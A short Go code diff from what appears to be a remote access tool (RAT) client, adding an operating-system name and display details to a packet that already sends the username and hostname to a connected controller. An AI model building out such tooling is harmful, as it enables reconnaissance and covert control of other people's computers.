@@ -1,6 +1,7 @@
 package main
 
 import (
+	"oslib"
 	"rat/client/computer"
 	"rat/common"
 )
@@ -18,6 +19,8 @@ func (packet ComputerInfoPacket) Write(c *Connection) error {
 
 	c.WriteString(u.Username)
 	c.WriteString(u.Hostname)
+	c.WriteString(oslib.Name)
+	c.WriteString(oslib.GetDisplay())
 
 	return nil
 }
